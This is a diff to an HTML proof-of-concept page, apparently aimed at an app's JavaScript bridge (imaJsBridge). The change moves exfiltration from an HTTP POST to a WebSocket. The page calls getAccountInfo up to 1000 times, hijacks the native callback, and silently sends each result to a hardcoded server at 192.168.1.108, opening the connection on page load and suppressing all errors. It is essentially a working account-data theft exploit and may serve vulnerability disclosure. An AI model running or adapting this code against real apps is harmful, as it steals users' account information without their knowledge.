@@ -2,68 +2,94 @@
 <html>
 
 <head>
-    <title>Poc</title>
+    <title>Poc - WebSocket版本</title>
 </head>
 
 <body>
-    <button onclick="poc()">执行 POC7</button>
+    <button onclick="poc()">执行 POC - WebSocket版本</button>
 
     <script>
-        // HTTP服务器配置
-        const HTTP_SERVER_URL = 'http://192.168.1.108:9999';  // 请修改为实际的服务器地址
+        // WebSocket配置
+        const WS_SERVER_URL = 'ws://192.168.1.108:9998';  // WebSocket服务器地址
+        let websocket = null;
+        let messageQueue = [];
+
+        function initWebSocket() {
+            if (websocket && websocket.readyState === WebSocket.OPEN) {
+                return Promise.resolve();
+            }
+
+            return new Promise((resolve, reject) => {
+                websocket = new WebSocket(WS_SERVER_URL);
+                
+                websocket.onopen = () => {
+                    // 发送队列中的消息
+                    while (messageQueue.length > 0) {
+                        websocket.send(messageQueue.shift());
+                    }
+                    resolve();
+                };
+
+                websocket.onerror = (error) => {
+                    reject(error);
+                };
+
+                websocket.onclose = () => {
+                    // 静默处理
+                };
+            });
+        }
 
         window.imaFrame = {
             callbackFromNative: function (callbackId, result) {
-                // 不显示任何输出，直接发送HTTP请求
-                sendToServer(callbackId, result);
+                sendToServerWS(callbackId, result);
             }
         };
 
-        function sendToServer(callbackId, result) {
+        async function sendToServerWS(callbackId, result) {
             try {
-                var payload = {
+                var payload = JSON.stringify({
                     callbackId: callbackId,
                     timestamp: Date.now(),
                     data: result
-                };
-
-                fetch(HTTP_SERVER_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('HTTP ' + response.status);
-                    }
-                    return response.text();
-                })
-                .then(data => {
-                    // 成功发送，不显示任何信息
-                })
-                .catch(error => {
-                    // 发送失败，也不显示错误信息
                 });
+
+                if (websocket && websocket.readyState === WebSocket.OPEN) {
+                    // 直接发送，无需等待响应
+                    websocket.send(payload);
+                } else {
+                    // 连接未建立，加入队列
+                    messageQueue.push(payload);
+                    if (!websocket || websocket.readyState === WebSocket.CLOSED) {
+                        try {
+                            await initWebSocket();
+                        } catch (error) {
+                            // 静默处理错误
+                        }
+                    }
+                }
             } catch (error) {
                 // 静默处理错误
             }
         }
 
-        function poc() {
-            for (var i = 0; i < 1000; i++) {
-                setTimeout(getAccountInfo, i)
+        async function poc() {
+            try {
+                await initWebSocket();
+                
+                // 连接建立后立即快速发送
+                for (var i = 0; i < 1000; i++) {
+                    setTimeout(getAccountInfo, i / 20);
+                }
+            } catch (error) {
+                // 静默处理错误
             }
-
-            // document.location.href="https://pov.ima.qq.com/";
-            // getAccountInfo()
         }
         
         function getAccountInfo() {
             try {
                 if (imaJsBridge && imaJsBridge.invokeWithCallback) {
-                    var callbackId = 'callback_' + Date.now();
+                    var callbackId = 'callback_' + Date.now() + '_' + Math.random();
                     var requestData = JSON.stringify({
                         action: "getAccountInfo",
                         callbackId: callbackId,
@@ -72,12 +98,24 @@
 
                     window.imaJsBridge.invokeWithCallback(requestData);
                 } else {
-                    // 接口不可用，也不显示错误信息
+                    // 接口不可用
                 }
             } catch (error) {
                 // 静默处理错误
             }
         }
+
+        // 页面加载时初始化WebSocket
+        window.onload = function() {
+            initWebSocket();
+        };
+
+        // 页面卸载时关闭连接
+        window.onbeforeunload = function() {
+            if (websocket) {
+                websocket.close();
+            }
+        };
 
     </script>
 </body>
